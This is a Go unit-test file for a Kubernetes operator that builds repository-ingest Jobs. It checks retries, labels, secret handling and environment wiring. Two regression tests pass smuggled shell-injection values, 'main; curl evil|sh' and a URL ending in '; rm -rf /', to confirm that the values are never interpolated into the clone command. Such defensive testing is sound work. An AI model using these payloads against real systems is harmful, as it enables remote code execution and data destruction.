package ingest

import (
	"net/url"
	"strings"
	"testing"

	tataradevv1alpha1 "github.com/szymonrychu/tatara-operator/api/v1alpha1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func testProject() *tataradevv1alpha1.Project {
	p := &tataradevv1alpha1.Project{}
	p.Name = "acme"
	p.Namespace = "tatara"
	p.Spec.ScmSecretRef = "acme-scm"
	return p
}

func testRepository() *tataradevv1alpha1.Repository {
	r := &tataradevv1alpha1.Repository{}
	r.Name = "widgets"
	r.Namespace = "tatara"
	r.UID = "repo-uid-123"
	r.Spec.ProjectRef = "acme"
	r.Spec.URL = "https://github.com/acme/widgets.git"
	r.Spec.DefaultBranch = "main"
	return r
}

const testBaseURL = "http://mem-acme.tatara.svc:8080"

func testConfig() Config {
	return Config{
		IngesterImage:    "registry.example/ingester:1.2.3",
		OIDCIssuer:       "https://kc.example/realms/tatara",
		OIDCClientID:     "tatara-operator",
		OIDCSecretName:   "tatara-operator",
		OIDCAudience:     "tatara-memory",
		Namespace:        "tatara",
		ImagePullSecret:  "regcred",
		OpenAISecretName: "tatara-openai",
		SemanticModel:    "gpt-4o-mini",
		CallbackURL:      "http://tatara-operator-internal.tatara.svc:8082",
	}
}

// TestBuildJob_IncrementalBackoffLimitIsZero verifies that incremental ingest
// jobs (since != "") use BackoffLimit=0. A missing-since-SHA failure (e.g. after
// a force-push) is deterministic at the pod level; zero retries ensures the
// controller reaches its full-ingest fallback after one pod attempt.
func TestBuildJob_IncrementalBackoffLimitIsZero(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "abc123", testBaseURL, testConfig())
	if job.Spec.BackoffLimit == nil || *job.Spec.BackoffLimit != 0 {
		t.Errorf("incremental ingest BackoffLimit = %v, want 0", job.Spec.BackoffLimit)
	}
}

// TestBuildJob_TerminationMessagePolicy verifies both the clone init container and
// the ingest container use FallbackToLogsOnError, so Kubernetes captures the tail
// of a non-zero-exit container's log into the Pod's terminated-state Message. The
// controller reads that back to record WHY an ingest failed before the GC'd Job
// pod's logs are gone.
func TestBuildJob_TerminationMessagePolicy(t *testing.T) {
	for _, since := range []string{"", "abc123"} {
		job := BuildJob(testProject(), testRepository(), since, testBaseURL, testConfig())
		init := job.Spec.Template.Spec.InitContainers[0]
		if init.TerminationMessagePolicy != corev1.TerminationMessageFallbackToLogsOnError {
			t.Errorf("since=%q clone TerminationMessagePolicy = %q, want FallbackToLogsOnError",
				since, init.TerminationMessagePolicy)
		}
		main := job.Spec.Template.Spec.Containers[0]
		if main.TerminationMessagePolicy != corev1.TerminationMessageFallbackToLogsOnError {
			t.Errorf("since=%q ingest TerminationMessagePolicy = %q, want FallbackToLogsOnError",
				since, main.TerminationMessagePolicy)
		}
	}
}

// TestBuildJob_IngestModeLabel verifies the Job and its Pod template carry the
// ingest-mode label the controller reads back to attribute the ingest metric:
// "incremental" when since is set, "full" otherwise.
func TestBuildJob_IngestModeLabel(t *testing.T) {
	for _, tc := range []struct {
		name  string
		since string
		want  string
	}{
		{"incremental", "abc123", IngestModeIncremental},
		{"full", "", IngestModeFull},
	} {
		t.Run(tc.name, func(t *testing.T) {
			job := BuildJob(testProject(), testRepository(), tc.since, testBaseURL, testConfig())
			if got := job.Labels[LabelIngestMode]; got != tc.want {
				t.Errorf("Job %s = %q, want %q", LabelIngestMode, got, tc.want)
			}
			if got := job.Spec.Template.Labels[LabelIngestMode]; got != tc.want {
				t.Errorf("Pod template %s = %q, want %q", LabelIngestMode, got, tc.want)
			}
		})
	}
}

func TestBuildJob_TTLSecondsAfterFinished(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	if job.Spec.TTLSecondsAfterFinished == nil {
		t.Fatal("TTLSecondsAfterFinished must be set")
	}
	if got := *job.Spec.TTLSecondsAfterFinished; got != 600 {
		t.Errorf("TTLSecondsAfterFinished = %d, want 600", got)
	}
}

func TestBuildJob_ImagePullSecrets(t *testing.T) {
	ips := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig()).Spec.Template.Spec.ImagePullSecrets
	if len(ips) != 1 || ips[0].Name != "regcred" {
		t.Fatalf("expected imagePullSecrets [regcred], got %v", ips)
	}
	cfg := testConfig()
	cfg.ImagePullSecret = ""
	if got := BuildJob(testProject(), testRepository(), "", testBaseURL, cfg).Spec.Template.Spec.ImagePullSecrets; len(got) != 0 {
		t.Fatalf("expected no imagePullSecrets when unset, got %v", got)
	}
}

func envValue(c corev1.Container, key string) string {
	for _, e := range c.Env {
		if e.Name == key {
			return e.Value
		}
	}
	return ""
}

func TestBuildJob_FullIngest(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())

	if job.Namespace != "tatara" {
		t.Errorf("namespace = %q, want tatara", job.Namespace)
	}
	if !strings.HasPrefix(job.Name, "widgets-ingest-") {
		t.Errorf("job name = %q, want prefix widgets-ingest-", job.Name)
	}
	if got := job.Spec.Template.Spec.RestartPolicy; got != corev1.RestartPolicyNever {
		t.Errorf("restartPolicy = %q, want Never", got)
	}
	// Full ingest (since="") keeps BackoffLimit=2 for transient-failure retry.
	if job.Spec.BackoffLimit == nil || *job.Spec.BackoffLimit != 2 {
		t.Errorf("full ingest backoffLimit = %v, want 2", job.Spec.BackoffLimit)
	}

	if len(job.OwnerReferences) != 1 {
		t.Fatalf("ownerReferences = %d, want 1", len(job.OwnerReferences))
	}
	or := job.OwnerReferences[0]
	if or.Kind != "Repository" || or.Name != "widgets" || string(or.UID) != "repo-uid-123" {
		t.Errorf("ownerRef = %+v, want Repository/widgets/repo-uid-123", or)
	}
	if or.Controller == nil || !*or.Controller {
		t.Error("ownerRef.Controller should be true")
	}

	initCs := job.Spec.Template.Spec.InitContainers
	if len(initCs) != 1 {
		t.Fatalf("init containers = %d, want 1", len(initCs))
	}
	clone := initCs[0]
	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
	// URL and branch are passed via env vars, not interpolated into the shell
	// command string, to prevent shell injection.
	if !strings.Contains(cloneCmd, `"$GIT_CLONE_URL"`) {
		t.Errorf("clone cmd must reference URL via env var $GIT_CLONE_URL: %q", cloneCmd)
	}
	if !strings.Contains(cloneCmd, `"$GIT_BRANCH"`) {
		t.Errorf("clone cmd must reference branch via env var $GIT_BRANCH: %q", cloneCmd)
	}
	if v := envValue(clone, "GIT_CLONE_URL"); v != "https://github.com/acme/widgets.git" {
		t.Errorf("GIT_CLONE_URL = %q, want https://github.com/acme/widgets.git", v)
	}
	if v := envValue(clone, "GIT_BRANCH"); v != "main" {
		t.Errorf("GIT_BRANCH = %q, want main", v)
	}

	cs := job.Spec.Template.Spec.Containers
	if len(cs) != 1 {
		t.Fatalf("containers = %d, want 1", len(cs))
	}
	main := cs[0]
	if main.Image != "registry.example/ingester:1.2.3" {
		t.Errorf("image = %q, want registry.example/ingester:1.2.3", main.Image)
	}

	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
	// repoDir is passed via GIT_REPO_DIR env var; command references it as "$GIT_REPO_DIR"
	if !strings.Contains(cmd, `tatara-ingest --repo-root "$GIT_REPO_DIR" --repo-name widgets --base-url http://mem-acme.tatara.svc:8080`) {
		t.Errorf("ingest cmd wrong: %q", cmd)
	}
	if strings.Contains(cmd, "--since") {
		t.Errorf("full ingest must not pass --since: %q", cmd)
	}
	if !strings.Contains(cmd, "widgets-ingest-result") {
		t.Errorf("ingest cmd must write result configmap: %q", cmd)
	}
	if v := envValue(main, "GIT_REPO_DIR"); v != "/workspace/acme/widgets" {
		t.Errorf("GIT_REPO_DIR = %q, want /workspace/acme/widgets", v)
	}

	if v := envValue(main, "BASE_URL"); v != "http://mem-acme.tatara.svc:8080" {
		t.Errorf("BASE_URL = %q", v)
	}
	if v := envValue(main, "OIDC_ISSUER"); v != "https://kc.example/realms/tatara" {
		t.Errorf("OIDC_ISSUER = %q", v)
	}
	if v := envValue(main, "OIDC_CLIENT_ID"); v != "tatara-operator" {
		t.Errorf("OIDC_CLIENT_ID = %q", v)
	}
	// OIDC_CLIENT_SECRET must be sourced from a SecretKeyRef, never a literal Value.
	if ref := envSecretRef(main, "OIDC_CLIENT_SECRET"); ref == nil {
		t.Error("OIDC_CLIENT_SECRET must use SecretKeyRef, not a literal Value")
	} else {
		if ref.Name != "tatara-operator" {
			t.Errorf("OIDC_CLIENT_SECRET secretKeyRef.name = %q, want tatara-operator", ref.Name)
		}
		if ref.Key != "OPERATOR_OIDC_CLIENT_SECRET" {
			t.Errorf("OIDC_CLIENT_SECRET secretKeyRef.key = %q, want OPERATOR_OIDC_CLIENT_SECRET", ref.Key)
		}
	}
	if v := envValue(main, "OIDC_AUDIENCE"); v != "tatara-memory" {
		t.Errorf("OIDC_AUDIENCE = %q", v)
	}
}

func TestBuildJob_IncrementalIngest(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "abc1234", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
	if !strings.Contains(cmd, "--since abc1234") {
		t.Errorf("incremental ingest must pass --since abc1234: %q", cmd)
	}
}

func TestBuildJob_SCMTokenFromSecret(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	clone := job.Spec.Template.Spec.InitContainers[0]
	var ref *corev1.EnvVarSource
	for _, e := range clone.Env {
		if e.Name == "SCM_TOKEN" {
			ref = e.ValueFrom
		}
	}
	if ref == nil || ref.SecretKeyRef == nil {
		t.Fatal("clone container must source SCM_TOKEN from a secret")
	}
	if ref.SecretKeyRef.Name != "acme-scm" || ref.SecretKeyRef.Key != "token" {
		t.Errorf("SCM_TOKEN secretKeyRef = %s/%s, want acme-scm/token",
			ref.SecretKeyRef.Name, ref.SecretKeyRef.Key)
	}
}

func TestBuildJob_SharedWorkspaceVolume(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	ps := job.Spec.Template.Spec
	var hasEmptyDir bool
	for _, v := range ps.Volumes {
		if v.Name == "workspace" && v.EmptyDir != nil {
			hasEmptyDir = true
		}
	}
	if !hasEmptyDir {
		t.Error("pod must have an emptyDir volume named workspace")
	}
	mounted := func(c corev1.Container) bool {
		for _, m := range c.VolumeMounts {
			if m.Name == "workspace" && m.MountPath == "/workspace" {
				return true
			}
		}
		return false
	}
	if !mounted(ps.InitContainers[0]) {
		t.Error("init container must mount workspace at /workspace")
	}
	if !mounted(ps.Containers[0]) {
		t.Error("main container must mount workspace at /workspace")
	}
	_ = metav1.Now
	_ = batchv1.Job{}
}

func TestBuildJob_BaseURLFromParameter(t *testing.T) {
	const ep = "http://mem-other.tatara.svc:8080"
	job := BuildJob(testProject(), testRepository(), "", ep, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
	if !strings.Contains(cmd, "--base-url "+ep) {
		t.Errorf("ingest cmd must carry parameter base-url %q: %q", ep, cmd)
	}
	if v := envValue(main, "BASE_URL"); v != ep {
		t.Errorf("BASE_URL = %q, want %q", v, ep)
	}
}

func TestBuildJob_FullHistoryClone(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	clone := job.Spec.Template.Spec.InitContainers[0]
	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
	if strings.Contains(cloneCmd, "--depth") {
		t.Errorf("clone must be full history (no --depth): %q", cloneCmd)
	}
	// branch is passed as env var; shell command references it as "$GIT_BRANCH"
	if !strings.Contains(cloneCmd, `--branch "$GIT_BRANCH"`) {
		t.Errorf("clone cmd must reference branch via env var: %q", cloneCmd)
	}
	if v := envValue(clone, "GIT_BRANCH"); v != "main" {
		t.Errorf("GIT_BRANCH = %q, want main", v)
	}
}

func envSecretRef(c corev1.Container, key string) *corev1.SecretKeySelector {
	for _, e := range c.Env {
		if e.Name == key && e.ValueFrom != nil {
			return e.ValueFrom.SecretKeyRef
		}
	}
	return nil
}

func TestBuildJob_OpenAIKeyFromSecret(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	ref := envSecretRef(main, "OPENAI_API_KEY")
	if ref == nil {
		t.Fatal("ingest container must source OPENAI_API_KEY from a secret")
	}
	if ref.Name != "tatara-openai" || ref.Key != "LLM_BINDING_API_KEY" {
		t.Errorf("OPENAI_API_KEY secretKeyRef = %s/%s, want tatara-openai/LLM_BINDING_API_KEY",
			ref.Name, ref.Key)
	}
}

func TestBuildJob_OpenAIKeyOmittedWhenSecretUnset(t *testing.T) {
	cfg := testConfig()
	cfg.OpenAISecretName = ""
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, cfg)
	main := job.Spec.Template.Spec.Containers[0]
	for _, e := range main.Env {
		if e.Name == "OPENAI_API_KEY" {
			t.Fatal("OPENAI_API_KEY must be omitted when OpenAISecretName is unset")
		}
	}
}

func TestBuildJob_SemanticModelEnv(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	if v := envValue(main, "SEMANTIC_MODEL"); v != "gpt-4o-mini" {
		t.Errorf("SEMANTIC_MODEL = %q, want gpt-4o-mini", v)
	}
}

// TestBuildJob_MetricsPushURL verifies the ingest Job is wired to push its
// Prometheus metrics to the operator's pushmetrics receiver: METRICS_PUSH_URL
// must be the receiver path with run_id (the Job name, so retries overwrite one
// run's series) and job=tatara-ingest already in the query string, since the
// ingester POSTs the URL verbatim without adding query parameters.
func TestBuildJob_MetricsPushURL(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	raw := envValue(main, "METRICS_PUSH_URL")
	if raw == "" {
		t.Fatal("METRICS_PUSH_URL must be set when CallbackURL is configured")
	}
	u, err := url.Parse(raw)
	if err != nil {
		t.Fatalf("METRICS_PUSH_URL %q is not a valid URL: %v", raw, err)
	}
	if u.Scheme+"://"+u.Host+u.Path != "http://tatara-operator-internal.tatara.svc:8082/internal/metrics/push" {
		t.Errorf("METRICS_PUSH_URL base = %q, want operator receiver path", u.Scheme+"://"+u.Host+u.Path)
	}
	if got := u.Query().Get("run_id"); got != job.Name {
		t.Errorf("METRICS_PUSH_URL run_id = %q, want job name %q", got, job.Name)
	}
	if got := u.Query().Get("job"); got != "tatara-ingest" {
		t.Errorf("METRICS_PUSH_URL job = %q, want tatara-ingest", got)
	}
}

// TestBuildJob_MetricsPushURLOmittedWhenCallbackUnset verifies the env is
// omitted (push is a no-op in the ingester) when CallbackURL is not configured.
func TestBuildJob_MetricsPushURLOmittedWhenCallbackUnset(t *testing.T) {
	cfg := testConfig()
	cfg.CallbackURL = ""
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, cfg)
	main := job.Spec.Template.Spec.Containers[0]
	for _, e := range main.Env {
		if e.Name == "METRICS_PUSH_URL" {
			t.Fatal("METRICS_PUSH_URL must be omitted when CallbackURL is unset")
		}
	}
}

func boolPtrJ(v bool) *bool { return &v }

func TestBuildJob_SemanticIngestEnv_True(t *testing.T) {
	repo := testRepository()
	repo.Spec.SemanticIngest = boolPtrJ(true)
	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	if v := envValue(main, "SEMANTIC_INGEST"); v != "true" {
		t.Errorf("SEMANTIC_INGEST = %q, want true", v)
	}
}

func TestBuildJob_SemanticIngestEnv_False(t *testing.T) {
	repo := testRepository()
	repo.Spec.SemanticIngest = boolPtrJ(false)
	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	if v := envValue(main, "SEMANTIC_INGEST"); v != "false" {
		t.Errorf("SEMANTIC_INGEST = %q, want false", v)
	}
}

// TestBuildJob_SemanticIngestEnv_NilDefaultsTrue verifies that a nil
// SemanticIngest pointer (field absent from YAML, default not yet applied by
// apiserver) is treated as true so ingest behaviour is unchanged for existing
// repos created before the *bool migration.
func TestBuildJob_SemanticIngestEnv_NilDefaultsTrue(t *testing.T) {
	repo := testRepository()
	repo.Spec.SemanticIngest = nil
	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	if v := envValue(main, "SEMANTIC_INGEST"); v != "true" {
		t.Errorf("nil SemanticIngest should default to true, got SEMANTIC_INGEST=%q", v)
	}
}

func TestBuildJob_NamespaceCloneDir(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())

	// widgets repo URL is https://github.com/acme/widgets.git -> acme/widgets
	const wantDir = "/workspace/acme/widgets"

	// repoDir is passed as GIT_REPO_DIR env var; commands reference it as "$GIT_REPO_DIR"
	clone := job.Spec.Template.Spec.InitContainers[0]
	if v := envValue(clone, "GIT_REPO_DIR"); v != wantDir {
		t.Errorf("clone GIT_REPO_DIR = %q, want %q", v, wantDir)
	}
	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
	if !strings.Contains(cloneCmd, `"$GIT_REPO_DIR"`) {
		t.Errorf("clone must reference dir via $GIT_REPO_DIR: %q", cloneCmd)
	}

	main := job.Spec.Template.Spec.Containers[0]
	if v := envValue(main, "GIT_REPO_DIR"); v != wantDir {
		t.Errorf("ingest GIT_REPO_DIR = %q, want %q", v, wantDir)
	}
	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
	if !strings.Contains(cmd, `--repo-root "$GIT_REPO_DIR"`) {
		t.Errorf("ingest cmd must use $GIT_REPO_DIR for repo-root: %q", cmd)
	}
	if !strings.Contains(cmd, `git -C "$GIT_REPO_DIR" rev-parse HEAD`) {
		t.Errorf("HEAD resolution must run via $GIT_REPO_DIR: %q", cmd)
	}
}

// TestBuildJob_ShellInjectionBranchNotInCmd verifies that a branch containing
// shell metacharacters is NOT interpolated into the clone command string.
// The value must appear only in the GIT_BRANCH env var; the command must
// reference it as "$GIT_BRANCH" so the shell never parses it as code.
func TestBuildJob_ShellInjectionBranchNotInCmd(t *testing.T) {
	repo := testRepository()
	repo.Spec.DefaultBranch = "main; curl evil|sh"
	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
	clone := job.Spec.Template.Spec.InitContainers[0]
	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
	if strings.Contains(cloneCmd, "curl evil") {
		t.Errorf("shell-injection payload must not appear in clone command: %q", cloneCmd)
	}
	if v := envValue(clone, "GIT_BRANCH"); v != "main; curl evil|sh" {
		t.Errorf("GIT_BRANCH env var must carry the raw branch value, got %q", v)
	}
}

// TestBuildJob_HTTPTimeoutEnv verifies that the ingest main container carries
// HTTP_TIMEOUT set to ingestHTTPTimeout (300s). Without this, the ingester
// defaults to 60s, which fired during transient LLM-extraction round-trips on
// 2026-06-20 (tatara-memory #47 incident: HTTP 499 client-abort -> ingest pods
// Errored).
func TestBuildJob_HTTPTimeoutEnv(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	v := envValue(main, "HTTP_TIMEOUT")
	if v != "300s" {
		t.Errorf("HTTP_TIMEOUT = %q, want 300s", v)
	}
}

// TestBuildJob_ShellInjectionURLNotInCmd verifies that a URL containing
// shell metacharacters is NOT interpolated into the clone command string.
func TestBuildJob_ShellInjectionURLNotInCmd(t *testing.T) {
	repo := testRepository()
	repo.Spec.URL = "https://github.com/acme/widgets.git; rm -rf /"
	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
	clone := job.Spec.Template.Spec.InitContainers[0]
	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
	if strings.Contains(cloneCmd, "rm -rf") {
		t.Errorf("shell-injection payload must not appear in clone command: %q", cloneCmd)
	}
	if v := envValue(clone, "GIT_CLONE_URL"); v != "https://github.com/acme/widgets.git; rm -rf /" {
		t.Errorf("GIT_CLONE_URL env var must carry the raw URL value, got %q", v)
	}
}

// TestBuildJob_OIDCSecretViaSecretKeyRef verifies that OIDC_CLIENT_SECRET is
// sourced from a SecretKeyRef and not embedded as a literal Value in the Job
// spec (which would expose it in etcd and kubectl get job -o yaml output).
func TestBuildJob_OIDCSecretViaSecretKeyRef(t *testing.T) {
	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
	main := job.Spec.Template.Spec.Containers[0]
	for _, e := range main.Env {
		if e.Name == "OIDC_CLIENT_SECRET" && e.Value != "" {
			t.Errorf("OIDC_CLIENT_SECRET must not be a literal Value; got %q", e.Value)
		}
	}
	ref := envSecretRef(main, "OIDC_CLIENT_SECRET")
	if ref == nil {
		t.Fatal("OIDC_CLIENT_SECRET must be sourced from a SecretKeyRef")
	}
	if ref.Name != "tatara-operator" || ref.Key != "OPERATOR_OIDC_CLIENT_SECRET" {
		t.Errorf("OIDC_CLIENT_SECRET secretKeyRef = %s/%s, want tatara-operator/OPERATOR_OIDC_CLIENT_SECRET",
			ref.Name, ref.Key)
	}
}

// TestBuildJob_DegenerateURLFallsBackToRepoName verifies that a URL with no
// meaningful path (e.g. bare host, no owner/repo) does not produce a clone
// directory of /workspace or /workspace/<host> that would collide between
// different repositories. The Job must fall back to the Repository name.
func TestBuildJob_DegenerateURLFallsBackToRepoName(t *testing.T) {
	tests := []struct {
		name string
		url  string
	}{
		{"bare host https", "https://github.com"},
		{"bare host with slash", "https://github.com/"},
		{"empty", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repo := testRepository()
			repo.Spec.URL = tt.url
			job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
			clone := job.Spec.Template.Spec.InitContainers[0]
			// repoDir is passed via GIT_REPO_DIR; must fall back to /workspace/<repo.Name>
			wantDir := "/workspace/" + repo.Name
			if v := envValue(clone, "GIT_REPO_DIR"); v != wantDir {
				t.Errorf("degenerate URL %q: GIT_REPO_DIR = %q, want %q", tt.url, v, wantDir)
			}
		})
	}
}
